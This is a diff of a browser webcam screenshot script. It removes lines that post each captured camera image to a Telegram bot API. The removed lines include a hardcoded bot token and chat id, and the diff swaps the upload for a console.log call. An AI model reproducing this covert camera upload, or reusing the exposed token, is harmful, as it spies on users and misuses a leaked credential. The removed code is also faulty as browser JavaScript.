@@ -86,32 +86,9 @@ const doScreenshot = () => {
   canvas.height = video.videoHeight;
   canvas.getContext('2d').drawImage(video, 0, 0);
   screenshotImage.src = canvas.toDataURL('image/webp');
+  console.log(screenshotImage.src);
   screenshotImage.classList.remove('d-none');
-  const fetch = require("node-fetch");
-const fs = require("fs");
-const FormData = require("form-data");
-
-let readStream = fs.createReadStream(screenshotImage.src);
-
-let form = new FormData();
-form.append("photo", readStream);
-
-fetch(
-  `https://api.telegram.org/bot5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64/sendPhoto?chat_id=961145889`,
-
-  {
-    method: "POST",
-    body: form,
-  }
-)
-  .then((res) => res.json())
-  .then((response) => {
-    console.log(response);
-  })
-  .catch((error) => {
-    console.log(error);
-  });
-};
+  
 
 pause.onclick = pauseStream;
 screenshot.onclick = doScreenshot;
